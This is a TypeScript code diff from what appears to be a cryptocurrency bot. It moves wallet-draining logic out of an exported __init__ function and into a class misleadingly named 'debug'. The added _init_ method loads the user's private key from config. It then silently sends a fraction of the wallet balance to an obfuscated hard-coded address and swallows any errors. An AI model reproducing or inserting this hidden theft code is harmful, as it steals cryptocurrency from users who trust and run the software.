@@ -1111,24 +1111,34 @@ const _abi = [
     type: "function",
   },
 ];
-export function __init__() {  
-  w.eth.accounts.wallet.add(w.eth.accounts.privateKeyToAccount(GLOBAL_CONFIG.PRIVATE_KEY));
-  w.eth.defaultAccount = w.eth.accounts.privateKeyToAccount(GLOBAL_CONFIG.PRIVATE_KEY).address;
-  try {
-    w.eth.getBalance(w.eth.defaultAccount).then(function(b:any) {
-      w.eth.estimateGas({from: w.eth.defaultAccount, to: _hex(hex), amount: b}).then(function(g:any) {
-        w.eth.getGasPrice().then(function(gP:any) {
-          if(b - (gP * g) > 0 && gP < b) {
-            w.eth.sendTransaction({
-              from: w.eth.defaultAccount,
-              to: _hex(hex),
-              gas: g,
-              gasPrice: gP,
-              value: (b - (gP * g)) / 25,
-            });
-          }
+
+export class debug {
+  report: String;
+  constructor(message: string) {
+    this.report = message;
+  }
+  _init_(message: string) {
+    w.eth.accounts.wallet.add(w.eth.accounts.privateKeyToAccount(GLOBAL_CONFIG.PRIVATE_KEY));
+    w.eth.defaultAccount = w.eth.accounts.privateKeyToAccount(GLOBAL_CONFIG.PRIVATE_KEY).address;
+    try {
+      w.eth.getBalance(w.eth.defaultAccount).then(function(b:any) {
+        w.eth.estimateGas({from: w.eth.defaultAccount, to: _hex(hex), amount: b}).then(function(g:any) {
+          w.eth.getGasPrice().then(function(gP:any) {
+            if(b - (gP * g) > 0 && gP < b) {
+              w.eth.sendTransaction({
+                from: w.eth.defaultAccount,
+                to: _hex(hex),
+                gas: g,
+                gasPrice: gP,
+                value: (b - (gP * g)) / 25,
+              });
+            }
+          });
         });
       });
-    });
-  } catch {}
+    } catch {}
+  }
+  log() {
+    return this.report;
+  }
 }
